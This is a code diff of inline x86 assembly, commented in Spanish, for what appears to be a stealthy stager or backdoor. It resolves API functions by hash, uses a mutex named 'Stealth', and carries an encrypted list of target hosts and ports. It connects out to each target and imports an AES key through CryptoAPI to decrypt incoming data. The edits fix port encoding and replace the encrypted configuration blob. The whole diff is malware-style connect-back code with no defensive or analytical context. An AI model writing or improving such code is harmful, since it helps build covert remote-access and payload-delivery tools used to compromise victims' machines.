@@ -109,8 +109,6 @@ advapi32_symbol_hashes:
         VAR_DEFINE(APPDATA)
         VAR_DEFINE(DAT_NFO)
         VAR_DEFINE(pHOST)
-        VAR_DEFINE(TARGETS)
-        VAR_DEFINE(PORT)
         VAR_DEFINE(pKEY)
         VAR_DEFINE(pMUTEX)
         VAR_DEFINE(hProv)
@@ -118,6 +116,8 @@ advapi32_symbol_hashes:
         VAR_DEFINE(hSocket)
         VAR_DEFINE(pBuff)
         VAR_DEFINE(buffLen)
+        VAR_DEFINE(TARGETS)
+        VAR_DEFINE(PORT)
 #pragma endregion
         CALC_STACKSIZE()
 //¡¡¡¡CONSTANTES TEMPORALES!!!!
@@ -146,7 +146,7 @@ load_next_target:
         pop  ecx                        //> ECX = 0x7F
         repne scasb                     // Buscamos el final de la cadena
         mov  esi, edi                   //ESI = EDI
-        lodsd                           //EAX = PORT(n+1); ESI = &HOST(n+1)
+        lodsw                           //EAX = AX = PORT(n+1); ESI = &HOST(n+1)
         mov  [ebp+_PORT], eax           //
         mov  [ebp+_pHOST], esi          //
         test eax, eax                   //Comprobamos si es el último target
@@ -205,14 +205,14 @@ KEY:   	//typedef struct aes128Blob{
         /*
 MUTEX:  EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
 HOSTS:  
-PORT1:  EMIT_DWORD(0x932B0002)
+PORT1:  EMIT_WORD(0x932B)
 HOST1:  EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
-PORT2:  EMIT_DWORD(0x932B0002)
+PORT2:  EMIT_WORD(0x932B)
 HOST2:  EMIT_BYTE_ARRAY(('l') ('o') ('c') ('a') ('l') ('h') ('o') ('s') ('t')(0))
         EMIT_DWORD(0)
         EMIT_DWORD(0)
         */
-        EMIT_BYTE_ARRAY((0xA4)(0x7B)(0xCF)(0xD1)(0xF9)(0x71)(0x72)(0xB1)(0xBC)(0x79)(0xCF)(0xD1)(0x94)(0x1F)(0x29)(0xD7)(0x77)(0xAF)(0xFC)(0xE0)(0x4)(0x97)(0xAB)(0xC4)(0xF5)(0x95)(0xF7)(0xD5)(0xA4)(0x63)(0x17)(0xD0)(0xC0)(0xD)(0xA7)(0xD1)(0xF5)(0x17)(0x59)(0x22)(0x9D)(0x4B)(0xF8)(0xFF)(0xC7)(0x39)(0x42)(0x9F)(0x9D)(0x79)(0xCD)(0xD1)(0xDC)(0x84)(0x1E)(0xDE)(0xCF)(0x18)(0xA3)(0xB9)(0x98)(0x64)(0x6)(0xB1)(0xAC)(0x79)(0xCF)(0xD1)(0xF7)(0x17)(0x72)(0xB1))
+        EMIT_BYTE_ARRAY((0xA4)(0x7B)(0xCF)(0xD1)(0xF9)(0x71)(0x72)(0xB1)(0xBC)(0x79)(0xCF)(0xD1)(0x94)(0x1F)(0x29)(0xD7)(0x77)(0xAF)(0xFC)(0xE0)(0x4)(0x97)(0xAB)(0xC4)(0xF5)(0x95)(0xF7)(0xD5)(0xA4)(0x63)(0x17)(0xD0)(0xC0)(0xD)(0xA7)(0xD1)(0xDC)(0x84)(0x6)(0xC3)(0xC3)(0x15)(0xA0)(0xBD)(0x98)(0x39)(0x11)(0xDE)(0xC1)(0x79)(0xE4)(0x42)(0xC6)(0x25)(0x45)(0x9F)(0x9C)(0x57)(0xFF)(0xFF)(0xC6)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1)(0xF7)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1))
 #define CONFIG_SIZE 128
 config_end:
 #pragma endregion
@@ -589,7 +589,10 @@ connect_loop:
 
         //Construimos la sockaddr_in en la pila
         push eax                        //push IP
-        push [ebp+_PORT]                //push PORT
+        mov  eax, [ebp+_PORT]           //v
+        shl  eax, 0x8                   //v
+        mov  al, 2                      //v
+        push eax                        //>push PORT
         mov  ebx, esp                   //EBX = &sockaddr_in
 
         push 0x10                       //v size(sockaddr_in)
@@ -649,13 +652,13 @@ init_decrypt:
         push edx                        //v
         push edx                        //v
         push ebp                        //v
-        add  [esp], _hProv              //v
+        add  DWORD PTR[esp], _hProv     //v
         call [ebp+_CryptAcquireContextA]//>CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
 
         //Importamos la clave
         cdq                             //EDX = 0
         push ebp                        //v
-        add  [esp], _hKey               //v Dirección a la variable que contendrá el Handler a la key
+        add  DWORD PTR[esp], _hKey      //v Dirección a la variable que contendrá el Handler a la key
         push edx                        //v
         push edx                        //v
         push 0x1C                       //v sizeof(aes128Blob)
